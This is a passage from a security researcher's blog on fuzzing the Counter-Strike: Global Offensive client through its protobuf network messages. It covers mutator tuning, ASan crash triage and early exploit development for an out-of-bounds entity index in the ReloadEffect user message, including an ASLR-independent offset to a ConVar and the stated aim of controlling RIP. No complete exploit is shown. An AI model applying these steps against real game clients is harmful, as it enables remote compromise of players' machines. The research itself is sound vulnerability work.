```

60786110   50.667    0.000  100.909    0.000 values.py:90(_fuzzdb_get_strings)

60973618/60973382   15.971    0.000  116.882    0.000 values.py:72(_limit_helper)

```
{% endraw %}

So I did a quick performance check on the mutator and as it turns out: it sucks ass in terms of performance.

I think that the majority of the time we are actually running the mutator instead of running the fuzzable program.

The top most time consuming functions are these:

{% raw %}
```
['60786110', '50.667', '0.000', '100.909', '0.000', 'values.py:90(_fuzzdb_get_strings)']
['60973618/60973382', '15.971', '0.000', '116.882', '0.000', 'values.py:72(_limit_helper)']
['62370202', '10.454', '0.000', '10.454', '0.000', '{method', "'decode'", 'of', "'bytes'", 'objects}']
['60981956', '8.501', '0.000', '8.501', '0.000', '{method', "'startswith'", 'of', "'str'", 'objects}']
['62200765', '8.266', '0.000', '8.266', '0.000', '{method', "'strip'", 'of', "'str'", 'objects}']
['4630', '6.180', '0.001', '116.114', '0.025', 'protofuzz.py:49(_string_generator)']
['483224', '5.386', '0.000', '7.283', '0.000', '{built-in', 'method', 'io.open}']
['1261780', '2.876', '0.000', '4.240', '0.000', 'pathlib.py:64(parse_parts)']
['156641', '2.419', '0.000', '3.050', '0.000', '{built-in', 'method', 'posix.listdir}']
['1261780', '2.264', '0.000', '7.095', '0.000', 'pathlib.py:672(_parse_args)']
['479148', '1.423', '0.000', '1.423', '0.000', '{method', "'__exit__'", 'of', "'_io._IOBase'", 'objects}']
['265', '1.367', '0.005', '8.150', '0.031', 'protofuzz.py:56(<listcomp>)']
['635784', '1.091', '0.000', '2.061', '0.000', 'pathlib.py:732(__str__)']


```
{% endraw %}

The most obvious optimization is that the _fuzzdb_get_strings functions reads the strings from the files. Instead of reading them every time, we should just just read them once and then access that list instead. I am honestly a bit surprised that the guy didn't do this.

After doing this simple optimization the graph looks like this:

{% raw %}
```
['60973645/60973543', '12.279', '0.000', '17.576', '0.000', 'values.py:72(_limit_helper)']
['60786110', '5.284', '0.000', '5.296', '0.000', 'values.py:92(_fuzzdb_get_strings)']
['4630', '4.399', '0.001', '20.805', '0.004', 'protofuzz.py:49(_string_generator)']
['265', '0.954', '0.004', '1.998', '0.008', 'protofuzz.py:56(<listcomp>)']
['373810/34633', '0.309', '0.000', '0.846', '0.000', 'gen.py:192(step_generator)']
```
{% endraw %}

I am a bit disappointed in the developer of that library, because that was such low hanging fruit that **EVEN I** spotted that.

Next thing to do is that the guy who programmed the protofuzz tool did not even actually mutate the outputs which the fuzzdb gives. Also the strings in fuzzdb are a load of garbage, because it contains a lot of shit we actually do not need. And also we want very specific strings in certain places for example in the HookClientStringTable function in client.ccp in the csgo source there is a shitton of string comparisons to strings.

--------------

Ok so after a bit of modding I am now actually mutating the strings and stuff which are taken out of the fuzzdb. In addition, I also added a generator which generates completely new outputs in the custom mutator code.

Now we are fuzzing a lot more effectively. In fact, the fuzzer has already found a couple of crashes (this time it is not because of the modding of the sequence code stuff but instead it is because of the packet itself.).

After putting those performance increasing patches in the mutator source code now I am getting around 100 execs a second when as before I was only getting like 30 execs a second.

Lets see what the fuzzer finds!

----------------------

## Crash triaging

Now, obviously I can not really share the crashes which the fuzzer found (atleast not yet), because they may be possible security bugs, however I can share you the methodology which I use to triage the crashes.

My plan is to just make a quick script which runs the client for every unique crash and then log the asan output to a file.

One thing which I hate about this thing is that -textmode does not work on csgo. If you look at https://developer.valvesoftware.com/wiki/Command_Line_Options there is the -textmode part and on it there is a note that -textmode does not apply for Counter Strike Global Offensive. This is complete bullshit in my opinion. If I try running csgo with -textmode, the window gets minified, but it is not completely hidden.

The reason why I want the textmode to work to begin with is because then I do not have to deal with the triage script opening up new windows every now and then.

Now looking at the engine/ subdirectory, there is a engine_inc.cmake file which says:

{% raw %}
```
remove_definitions(-DBASE) #used by cryptopp REEE
add_definitions(-DALLOW_TEXT_MODE=1)
```
{% endraw %}

but then in the appframework/ subdirectory, we get some peculiar shit.

After doing a couple of quick source patches which now enable the -textmode even in appframework directory too, now it crashes on the shaderapi thing. This can be simply fixed by using -noshaderapi , then it crashes on this:

{% raw %}
```
=================================================================
==832828==ERROR: AddressSanitizer: SEGV on unknown address 0x0000000001c8 (pc 0x7f0f0eeb51b7 bp 0x7fff9378baa0 sp 0x7fff9378ba90 T0)
==832828==The signal is caused by a READ memory access.
==832828==Hint: address points to the zero page.
    #0 0x7f0f0eeb51b6 in IDirect3DDevice9::RestoreGLState() /home/cyberhacker/Codecoveragething/Kisak-Strike/togl/dxabstract.cpp:5879
    #1 0x7f0f0a3068a9 in V_RenderVGuiOnly_NoSwap() /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/view.cpp:140
    #2 0x7f0f0a307604 in V_RenderView() /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/view.cpp:254
    #3 0x7f0f0a7a657b in SCR_UpdateScreen() /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/gl_screen.cpp:306
    #4 0x7f0f0aebf928 in _Host_RunFrame_Render() /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/host.cpp:3460
    #5 0x7f0f0aec6253 in _Host_RunFrame(float) /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/host.cpp:4557
    #6 0x7f0f0aed023c in Host_RunFrame(float) /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/host.cpp:4688
    #7 0x7f0f0aef58f0 in CHostState::State_Run(float) /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/host_state.cpp:611
    #8 0x7f0f0aef6b53 in CHostState::FrameUpdate(float) /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/host_state.cpp:805
    #9 0x7f0f0b1347d9 in CEngine::Frame() /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/sys_engine.cpp:572
    #10 0x7f0f0b12499f in CEngineAPI::MainLoop() /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/sys_dll2.cpp:1161
    #11 0x7f0f0b124ef4 in CModAppSystemGroup::Main() /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/sys_dll2.cpp:2416
    #12 0x7f0f0b124ef4 in CModAppSystemGroup::Main() /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/sys_dll2.cpp:2374
    #13 0x7f0f0b8ba85f in CAppSystemGroup::Run() /home/cyberhacker/Codecoveragething/Kisak-Strike/appframework/AppSystemGroup.cpp:775
    #14 0x7f0f0b12ac52 in CEngineAPI::RunListenServer() /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/sys_dll2.cpp:1437
    #15 0x7f0f0fa0401f in CAppSystemGroup::Run() /home/cyberhacker/Codecoveragething/Kisak-Strike/appframework/AppSystemGroup.cpp:775
    #16 0x7f0f0fa0401f in CAppSystemGroup::Run() /home/cyberhacker/Codecoveragething/Kisak-Strike/appframework/AppSystemGroup.cpp:775
    #17 0x7f0f0f9ec995 in LauncherMain /home/cyberhacker/Codecoveragething/Kisak-Strike/launcher/launcher.cpp:1897
    #18 0x7f0f130f7082 in __libc_start_main ../csu/libc-start.c:308
    #19 0x555fb9e8d27d in _start (/home/cyberhacker/Codecoveragething/game/csgo_linux64+0x127d)

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV /home/cyberhacker/Codecoveragething/Kisak-Strike/togl/dxabstract.cpp:5879 in IDirect3DDevice9::RestoreGLState()
==832828==ABORTING



```
{% endraw %}


After patching out the _Host_RunFrame_Render function out now we crash on this:

{% raw %}
```

AddressSanitizer:DEADLYSIGNAL
=================================================================
==834402==ERROR: AddressSanitizer: SEGV on unknown address 0x0000000001c8 (pc 0x7fd9c0cb51b7 bp 0x7fff8fc0bd40 sp 0x7fff8fc0bd30 T0)
==834402==The signal is caused by a READ memory access.
==834402==Hint: address points to the zero page.
    #0 0x7fd9c0cb51b6 in IDirect3DDevice9::RestoreGLState() /home/cyberhacker/Codecoveragething/Kisak-Strike/togl/dxabstract.cpp:5879
    #1 0x7fd9bc1908a9 in V_RenderVGuiOnly_NoSwap() /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/view.cpp:140
    #2 0x7fd9bc191604 in V_RenderView() /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/view.cpp:254
    #3 0x7fd9bc63057b in SCR_UpdateScreen() /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/gl_screen.cpp:306
    #4 0x7fd9bc6320de in SCR_BeginLoadingPlaque(char const*) /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/gl_screen.cpp:132
    #5 0x7fd9bcd7ff80 in CHostState::State_Run(float) /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/host_state.cpp:630
    #6 0x7fd9bcd80bd3 in CHostState::FrameUpdate(float) /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/host_state.cpp:805
    #7 0x7fd9bcfbe859 in CEngine::Frame() /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/sys_engine.cpp:572
    #8 0x7fd9bcfaea1f in CEngineAPI::MainLoop() /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/sys_dll2.cpp:1161
    #9 0x7fd9bcfaef74 in CModAppSystemGroup::Main() /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/sys_dll2.cpp:2416
    #10 0x7fd9bcfaef74 in CModAppSystemGroup::Main() /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/sys_dll2.cpp:2374
    #11 0x7fd9bd7448df in CAppSystemGroup::Run() /home/cyberhacker/Codecoveragething/Kisak-Strike/appframework/AppSystemGroup.cpp:775
    #12 0x7fd9bcfb4cd2 in CEngineAPI::RunListenServer() /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/sys_dll2.cpp:1437
    #13 0x7fd9c180401f in CAppSystemGroup::Run() /home/cyberhacker/Codecoveragething/Kisak-Strike/appframework/AppSystemGroup.cpp:775
    #14 0x7fd9c180401f in CAppSystemGroup::Run() /home/cyberhacker/Codecoveragething/Kisak-Strike/appframework/AppSystemGroup.cpp:775
    #15 0x7fd9c17ec995 in LauncherMain /home/cyberhacker/Codecoveragething/Kisak-Strike/launcher/launcher.cpp:1897
    #16 0x7fd9c4f81082 in __libc_start_main ../csu/libc-start.c:308
    #17 0x55616acc427d in _start (/home/cyberhacker/Codecoveragething/game/csgo_linux64+0x127d)

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV /home/cyberhacker/Codecoveragething/Kisak-Strike/togl/dxabstract.cpp:5879 in IDirect3DDevice9::RestoreGLState()
==834402==ABORTING


```
{% endraw %}

if (!(CommandLine()->FindParm( "-textmode" )))

if ((CommandLine()->FindParm( "-textmode" )))


After doing a bit of fiddling with the code, it now works without showing any graphics, which is absolutely fantastic for our purposes, since


## Fiddling around with weird 0xff behaviour

I think that I have found a medium severity bug in the code and now when investigating it, it looks like the packet contents gets replaced by a lot of 0xffffff and so on before it is process after passing the packet through the file. I am now trying to figure out what causes such behaviour.

I got it narrowed down to this:

{% raw %}
```
#include <iostream>
#include <fstream>
#include <string>
#include "mymessages.pb.h"
using namespace std;




// Main function:  Reads the entire packet from file,
//   modifies the string_data field and then writes the modified version back to disk.


void print_hex2(const char* string, int length) {
  for (int i = 0; i<length;i++) {
    printf("%02x", (unsigned int) *string++);
  }
  printf("\n");
}


int main(int argc, char* argv[]) {
  // Verify that the version of the library that we linked against is
  // compatible with the version of the headers we compiled against.
  GOOGLE_PROTOBUF_VERIFY_VERSION;

  if (argc != 3) {
    cerr << "Usage:  " << argv[0] << " PACKET_FILE OUTPUT_FILE" << endl;
    return -1;
  }
  samplemessage thing;

  {
    // Read the existing address book.
    fstream input(argv[1], ios::in | ios::binary);
    if (!input) {
      cout << argv[1] << ": File not found.  Creating a new file." << endl;
    } else if (!thing.ParseFromIstream(&input)) {
      cerr << "Failed to parse packet file." << endl;
      return -1;
    }
  }

  


  print_hex2(thing.byte_string().c_str(), strlen(thing.byte_string().c_str()));

  printf("%s\n", thing.byte_string().c_str());

  unsigned char stuff[10000] = "\x41\x80";


  thing.set_byte_string(reinterpret_cast<const unsigned char *>(stuff));


  printf("%s\n", thing.byte_string().c_str());


  print_hex2(thing.byte_string().c_str(), strlen(thing.byte_string().c_str()));

  {
    // Write the new packet to disk.
    fstream output(argv[2], ios::out | ios::trunc | ios::binary);
    if (!thing.SerializeToOstream(&output)) {
      cerr << "Failed to write packet file." << endl;
      return -1;
    }
  }

  // Optional:  Delete all global objects allocated by libprotobuf.
  google::protobuf::ShutdownProtobufLibrary();

  return 0;
}

```
{% endraw %}

and:

{% raw %}
```
message samplemessage
{
	optional bytes byte_string = 1;
}

```
{% endraw %}

That program outputs this:

{% raw %}
```
41ffffff80
```
{% endraw %}

Now when I change the 0x80 to 0x7f, it outputs this:

{% raw %}
```
417f
```
{% endraw %}

So the problem lies in the way that the protobuf encodes bytes. This is very misleading in my opinion, because the bytes field is supposed to encode raw bytes, so I expect to get the exact same bytes out as I put in (aka without the 0xff bytes) .

This is complete bullshit in my opinion and if this is by design (which I assume it is) then this was a very shit design choice imho.. That is why the packet handler shows a lot of 0xff bytes in the hex output when it tries dumping the contents of the message. I can not yet disclose any of the details of this vulnerability because I am still assessing it. This is just some very strange behaviour which I encountered in the process.

Yeah I think that this encoding shit will probably make the exploitation of this bug a lot more difficult but anyway.

I fired up the peruvian were rabbit on this crash to get a better understanding of the crash.

In the mean time lets try to improve the mutator.

## Improving the mutator even further.


In the usermessage message in netmessages.proto:

{% raw %}
```
message CSVCMsg_UserMessage
{
	optional int32 msg_type = 1;
	optional bytes msg_data = 2;	
	optional int32 passthrough = 3;// 0 or absent = normal event; 1 = pass-through real-time event needed during replay
}
```
{% endraw %}

usermessages.proto :

{% raw %}
```
enum ECstrike15UserMessages {
	CS_UM_VGUIMenu = 1;
	CS_UM_Geiger = 2;
	CS_UM_Train = 3;
	CS_UM_HudText = 4;
	CS_UM_SayText = 5;
	CS_UM_SayText2 = 6;
	CS_UM_TextMsg = 7;
	CS_UM_HudMsg = 8;
	CS_UM_ResetHud = 9;
	CS_UM_GameTitle = 10;
	CS_UM_Shake = 12;
	CS_UM_Fade = 13;
	CS_UM_Rumble = 14;
	CS_UM_CloseCaption = 15;
	CS_UM_CloseCaptionDirect = 16;
	CS_UM_SendAudio = 17;
	CS_UM_RawAudio = 18;
	CS_UM_VoiceMask = 19;
	CS_UM_RequestState = 20;
	CS_UM_Damage = 21;
	CS_UM_RadioText = 22;
	CS_UM_HintText = 23;
	CS_UM_KeyHintText = 24;
	CS_UM_ProcessSpottedEntityUpdate = 25;
	CS_UM_ReloadEffect = 26;
	CS_UM_AdjustMoney = 27;
	CS_UM_UpdateTeamMoney = 28;
	CS_UM_StopSpectatorMode = 29;
	CS_UM_KillCam = 30;
	CS_UM_DesiredTimescale = 31;
	CS_UM_CurrentTimescale = 32;
	CS_UM_AchievementEvent = 33;
	CS_UM_MatchEndConditions = 34;
	CS_UM_DisconnectToLobby = 35;
	CS_UM_PlayerStatsUpdate = 36;
	CS_UM_DisplayInventory = 37;
	CS_UM_WarmupHasEnded = 38;
	CS_UM_ClientInfo = 39;
	CS_UM_XRankGet = 40;
	CS_UM_XRankUpd = 41;
	CS_UM_CallVoteFailed = 45;
	CS_UM_VoteStart = 46;
	CS_UM_VotePass = 47;
	CS_UM_VoteFailed = 48;
	CS_UM_VoteSetup = 49;
	CS_UM_ServerRankRevealAll = 50;
	CS_UM_SendLastKillerDamageToClient = 51;
	CS_UM_ServerRankUpdate = 52;
	CS_UM_ItemPickup = 53;
	CS_UM_ShowMenu = 54;
	CS_UM_BarTime = 55;
	CS_UM_AmmoDenied = 56;
	CS_UM_MarkAchievement = 57;
	CS_UM_MatchStatsUpdate = 58;
	CS_UM_ItemDrop = 59;
	CS_UM_GlowPropTurnOff = 60;
	CS_UM_SendPlayerItemDrops = 61;
	CS_UM_RoundBackupFilenames = 62;
	CS_UM_SendPlayerItemFound = 63;
	CS_UM_ReportHit = 64;
	CS_UM_XpUpdate = 65;
	CS_UM_QuestProgress = 66;
	CS_UM_ScoreLeaderboardData = 67;
	CS_UM_PlayerDecalDigitalSignature = 68;
	CS_UM_WeaponSound = 69;
	CS_UM_UpdateScreenHealthBar = 70;
	CS_UM_EntityOutlineHighlight = 71;
	CS_UM_SSUI = 72;
	CS_UM_SurvivalStats = 73;
	CS_UM_DisconnectToLobby2 = 74;
	CS_UM_EndOfMatchAllPlayersData = 75;
}

```
{% endraw %}

After a bit of hacking I basically came up with this:


{% raw %}
```



def mutate_user_message(message, user_msg_type):
	
	if random.random() > OWN_MUTATOR_CHANCE:
		return message, False

	res = [field for field in message.DESCRIPTOR.fields]

	#print([x.type for x in res])

	random_field = random.choice(res)

	while random_field.label == random_field.LABEL_REPEATED:
		random_field = random.choice(res)

	# basically switch case for random_field
	field_type = random_field.type
	#print("field_type == "+str(field_type))
	if field_type == TYPE_STRING:

		original_string = getattr(message, random_field.name)
		new_string = mutate_bytes(original_string)
		setattr(message, random_field.name, str(new_string))
		return message, True	
	if field_type == TYPE_BYTES:

		original_bytes= getattr(message, random_field.name)
		new_string = mutate_bytes(original_bytes)
		setattr(message, random_field.name, str(new_string))
		return message, True
	if field_type == TYPE_INT32:
		#print("rrrrrrrrrrrrrrrrrrrr")
		#original_integer = getattr(message, random_field.name)
		message, _ = set_int(message, random_field)
		#setattr(message, random_field.name, str(new_string))
		return message, True


	if field_type == TYPE_INT64:
		#print("rrrrrrrrrrrrrrrrrrrr")
		#original_integer = getattr(message, random_field.name)
		message, _ = set_int(message, random_field)
		#setattr(message, random_field.name, str(new_string))
		return message, True

	if field_type == TYPE_BOOL:

		message, _ = set_bool(message, random_field)

		return message, True
	'''
	if field_type == TYPE_MESSAGE:

		print("Mutating submessage.")

		message, result = mutate_submessage(getattr(message, random_field.name))
		return message, result
	'''


	'''
	if field_type == TYPE_MESSAGE:

		print("Mutating submessage.")

		message2, result = mutate_submessage(getattr(message, random_field.name))
		#message.random_field = message2

		print("random_field.name == "+str(random_field.name))

		try:
			setattr(message, random_field.name, message2)
			return message, result
		except:
			return message, False
	'''

	#print("==============================================")
	#print(message)
	#print("==============================================")

	return message, False
	


```
{% endraw %}

The set_int and set_bool are basically just the methods to set the values to the appropriate data types.


Now we can fuzz effectively while we investigate the other bug.

--------------------------------------------------------------------------

As it turns out the other bug is not that exploitable.

I banlisted the strintable messages from my custom fuzzer and I found a very interesting bug, which seems exploitable.

First there is this

{% raw %}
```

DuCalled NET_ProcessSocket!
AddressSanitizer:DEADLYSIGNAL
=================================================================
==229826==ERROR: AddressSanitizer: SEGV on unknown address 0x7f84368e1e28 (pc 0x7f83e140fb8d bp 0x7ffd02d88fa0 sp 0x7ffd02d88f80 T0)
==229826==The signal is caused by a READ memory access.
    #0 0x7f83e140fb8c in CBaseEntityList::LookupEntityByNetworkIndex(int) const /home/cyberhacker/Codecoveragething/Kisak-Strike/game/shared/entitylist_base.h:173
    #1 0x7f83e140fb8c in CClientEntityList::GetListedEntity(int) /home/cyberhacker/Codecoveragething/Kisak-Strike/game/client/cliententitylist.h:254
    #2 0x7f83e140fb8c in CClientEntityList::GetBaseEntity(int) /home/cyberhacker/Codecoveragething/Kisak-Strike/game/client/cliententitylist.cpp:195
    #3 0x7f83e2c41821 in __MsgFunc_ReloadEffect(CCSUsrMsg_ReloadEffect const&) /home/cyberhacker/Codecoveragething/Kisak-Strike/game/client/cstrike15/c_cs_player.cpp:1446
    #4 0x7f83e1c739ef in CUserMessages::DispatchUserMessage(int, int, int, void const*) /home/cyberhacker/Codecoveragething/Kisak-Strike/game/shared/usermessages.cpp:97
    #5 0x7f83f4e03546 in CClientState::SVCMsg_UserMessage(CSVCMsg_UserMessage const&) /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/servermsghandler.cpp:727
    #6 0x7f83f4a9a708 in CNetChan::_ProcessMessages(bf_read&, bool) /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/net_chan.cpp:2568
    #7 0x7f83f4a9be02 in CNetChan::ProcessMessages(bf_read&, bool) /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/net_chan.cpp:2413
    #8 0x7f83f4aa9689 in CNetChan::ProcessPacket(netpacket_s*, bool) /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/net_chan.cpp:3195
    #9 0x7f83f4ae5011 in replaypacket(CNetChan*, int) /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/net_ws.cpp:2431
    #10 0x7f83f4af0d7f in NET_ProcessSocket(int, IConnectionlessPacketHandler*) /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/net_ws.cpp:2578
    #11 0x7f83f3f614aa in CL_ReadPackets(bool) /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/cl_main.cpp:512
    #12 0x7f83f4a17394 in _Host_RunFrame_Client(bool) /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/host.cpp:3368
    #13 0x7f83f4a1d257 in _Host_RunFrame(float) /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/host.cpp:4283
    #14 0x7f83f4a2806c in Host_RunFrame(float) /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/host.cpp:4693
    #15 0x7f83f4a4d840 in CHostState::State_Run(float) /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/host_state.cpp:611
    #16 0x7f83f4a4eaf3 in CHostState::FrameUpdate(float) /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/host_state.cpp:808
    #17 0x7f83f4c8d7a9 in CEngine::Frame() /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/sys_engine.cpp:572
    #18 0x7f83f4c7d96f in CEngineAPI::MainLoop() /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/sys_dll2.cpp:1161
    #19 0x7f83f4c7dec4 in CModAppSystemGroup::Main() /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/sys_dll2.cpp:2416
    #20 0x7f83f4c7dec4 in CModAppSystemGroup::Main() /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/sys_dll2.cpp:2374
    #21 0x7f83f54137df in CAppSystemGroup::Run() /home/cyberhacker/Codecoveragething/Kisak-Strike/appframework/AppSystemGroup.cpp:775
    #22 0x7f83f4c83c22 in CEngineAPI::RunListenServer() /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/sys_dll2.cpp:1437
    #23 0x7f83f950401f in CAppSystemGroup::Run() /home/cyberhacker/Codecoveragething/Kisak-Strike/appframework/AppSystemGroup.cpp:775
    #24 0x7f83f950401f in CAppSystemGroup::Run() /home/cyberhacker/Codecoveragething/Kisak-Strike/appframework/AppSystemGroup.cpp:775
    #25 0x7f83f94ec995 in LauncherMain /home/cyberhacker/Codecoveragething/Kisak-Strike/launcher/launcher.cpp:1897
    #26 0x7f83fcc58082 in __libc_start_main ../csu/libc-start.c:308
    #27 0x563bf15c127d in _start (/home/cyberhacker/Codecoveragething/game/csgo_linux64+0x127d)

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV /home/cyberhacker/Codecoveragething/Kisak-Strike/game/shared/entitylist_base.h:173 in CBaseEntityList::LookupEntityByNetworkIndex(int) const
==229826==ABORTING
'id:000006,sig:06,src:000088+000082,time:221939,execs:41949,op:(null),pos:0'



```
{% endraw %}

here is the relevant code:

{% raw %}
```

inline IHandleEntity* CBaseEntityList::LookupEntityByNetworkIndex( int edictIndex ) const
{
	// (Legacy support).
	if ( edictIndex < 0 )
		return NULL;

	Assert( edictIndex < NUM_ENT_ENTRIES );
	return m_EntPtrArray[edictIndex].m_pEntity;
}


```
{% endraw %}

If we look at this code:

{% raw %}
```
bool __MsgFunc_ReloadEffect( const CCSUsrMsg_ReloadEffect &msg )
{
	int iPlayer = msg.entidx();
	int iActAnimID = msg.has_actanim() ? msg.actanim() : ACT_VM_RELOAD;

	Vector origin;
	Vector *pOrigin = NULL;
	if ( msg.has_origin_x() )
	{
		origin.x = msg.origin_x();
		origin.y = msg.origin_y();
		origin.z = msg.origin_z();
		pOrigin = &origin;
	}

	C_CSPlayer *pPlayer = dynamic_cast< C_CSPlayer* >( C_BaseEntity::Instance( iPlayer ) );
	if ( pPlayer )
		pPlayer->PlayReloadEffect( iActAnimID, pOrigin );

	return true;	
}
```
{% endraw %}

we see that a method is called almost directly after the object is retrieved using the entity index on the object itself. This is fantastic. Also as it turns out the m_EntPtrArray array is global.

{% raw %}
```
class CEntInfo
{
public:
	IHandleEntity	*m_pEntity;
	int				m_SerialNumber;
	CEntInfo		*m_pPrev;
	CEntInfo		*m_pNext;
#ifdef GAME_DLL	
	string_t		m_iName;
	string_t		m_iClassName;
#endif

	void			ClearLinks();
};


```
{% endraw %}


m_EntPtrArray is an array of objects of type CEntInfo so we get the m_pEntity of that said object.

{% raw %}
```
   0x7fffca81a847 <CClientEntityList::GetBaseEntity(int)+23>:	je     0x7fffca81a850 <CClientEntityList::GetBaseEntity(int)+32>
   0x7fffca81a849 <CClientEntityList::GetBaseEntity(int)+25>:	mov    rax,QWORD PTR [rdi]
(gdb) x/10i $rip-0x20
   0x7fffca81a81f <CClientEntityList::RecomputeHighestEntityUsed()+63>:	add    bl,al
   0x7fffca81a821:	nop
   0x7fffca81a822:	data16 nop WORD PTR cs:[rax+rax*1+0x0]
   0x7fffca81a82d:	nop    DWORD PTR [rax]
   0x7fffca81a830 <CClientEntityList::GetBaseEntity(int)>:	endbr64 
   0x7fffca81a834 <CClientEntityList::GetBaseEntity(int)+4>:	test   esi,esi
   0x7fffca81a836 <CClientEntityList::GetBaseEntity(int)+6>:	js     0x7fffca81a850 <CClientEntityList::GetBaseEntity(int)+32>
   0x7fffca81a838 <CClientEntityList::GetBaseEntity(int)+8>:	movsxd rsi,esi
   0x7fffca81a83b <CClientEntityList::GetBaseEntity(int)+11>:	shl    rsi,0x5
=> 0x7fffca81a83f <CClientEntityList::GetBaseEntity(int)+15>:	mov    rdi,QWORD PTR [rdi+rsi*1+0x8]

```
{% endraw %}

the js instruction checks if the value is signed so the test and js check if the value is negative. This corresponds to the code. The movsxd instruction just extends the value. The shl just a way to get the offset into the list, because the index is in rsi. each of the elements are 8*4 bytes long aka 32 bytes long and 8*4*x==(1*x)<<5 applies for every integer x which is the index into the list.

This blog post: https://secret.club/2021/05/13/source-engine-rce-join.html uses ConVars as gadgets so I think that I am going to do the same.

{% raw %}
```

(gdb) x/10wx &sv_consistency 
0x7fffe64e91c0 <sv_consistency>:	0xe62c30c8	0x00007fff	0xe64e9120	0x00007fff
0x7fffe64e91d0 <sv_consistency+16>:	0x00000001	0x00000000	0xe606fe76	0x00007fff
0x7fffe64e91e0 <sv_consistency+32>:	0xe606f160	0x00007fff


```
{% endraw %}

and:

{% raw %}
```

(gdb) x/10wx &s_EntityList 
0x7fffcb641780 <_ZL12s_EntityList>:	0xcb4043a8	0x00007fff	0x6129afe0	0x00005555
0x7fffcb641790 <_ZL12s_EntityList+16>:	0x000001f7	0x00000000	0x00000000	0x00000000
0x7fffcb6417a0 <_ZL12s_EntityList+32>:	0xcb6417a8	0x00007fff

```
{% endraw %}

if we take the offset:


{% raw %}
```
Python 3.12.0a7+ (heads/main:6d97e52116, Apr  9 2023, 23:34:20) [GCC 9.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> 0x7fffe64e91c0>0x7fffcb641780
True
>>> 0x7fffe64e91c0-0x7fffcb641780
451574336
>>> hex(0x7fffe64e91c0-0x7fffcb641780)
'0x1aea7a40'
>>> 

```
{% endraw %}

does this offset stay the same accross runs?

Yes it seems to be, therefore we do not really need to worry about aslr or shit like that since even though the absolute addresses are random, the two objects appear in memory at the same offset always.

Now, the next step is to try to get control over RIP .

{% raw %}
```
static	ConVar	sv_pausable( "sv_pausable","0", FCVAR_RELEASE, "Is the server pausable." );
static	ConVar	sv_contact( "sv_contact", "", FCVAR_NOTIFY  | FCVAR_RELEASE, "Contact email for server sysop" );
static	ConVar	sv_cacheencodedents("sv_cacheencodedents", "1", 0, "If set to 1, does an optimization to prevent extra SendTable_Encode calls.");
        ConVar	sv_voicecodec("sv_voicecodec", "vaudio_celt", FCVAR_RELEASE | FCVAR_REPLICATED, "Specifies which voice codec DLL to use in a game. Set to the name of the DLL without the extension.");
static	ConVar	sv_voiceenable( "sv_voiceenable", "1", FCVAR_ARCHIVE|FCVAR_NOTIFY  | FCVAR_RELEASE ); // set to 0 to disable all voice forwarding.
        ConVar  sv_downloadurl( "sv_downloadurl", "", FCVAR_REPLICATED | FCVAR_RELEASE, "Location from which clients can download missing files" );
        ConVar  sv_consistency( "sv_consistency", "0", FCVAR_REPLICATED | FCVAR_RELEASE, "Whether the server enforces file consistency for critical files" );
        ConVar	sv_maxreplay("sv_maxreplay", "0", 0, "Maximum replay time in seconds", true, 0, true, 30 );

```
{% endraw %}



sv_consistency is of type ConVar .

{% raw %}
```
class ConVar : public ConCommandBase, public IConVar
{
friend class CCvar;
friend class ConVarRef;
friend class SplitScreenConVarRef;

public:
	typedef ConCommandBase BaseClass;

								ConVar( const char *pName, const char *pDefaultValue, int flags = 0);

								ConVar( const char *pName, const char *pDefaultValue, int flags, 
									const char *pHelpString );
								ConVar( const char *pName, const char *pDefaultValue, int flags, 
									const char *pHelpString, bool bMin, float fMin, bool bMax, float fMax );
								ConVar( const char *pName, const char *pDefaultValue, int flags, 
									const char *pHelpString, FnChangeCallback_t callback );
								ConVar( const char *pName, const char *pDefaultValue, int flags, 
									const char *pHelpString, bool bMin, float fMin, bool bMax, float fMax,
									FnChangeCallback_t callback );

	virtual						~ConVar( void );

	virtual bool				IsFlagSet( int flag ) const;
	virtual const char*			GetHelpText( void ) const;
	virtual bool				IsRegistered( void ) const;
	virtual const char			*GetName( void ) const;
	// Return name of command (usually == GetName(), except in case of FCVAR_SS_ADDED vars
	virtual const char			*GetBaseName( void ) const;
	virtual int					GetSplitScreenPlayerSlot() const;

	virtual void				AddFlags( int flags );
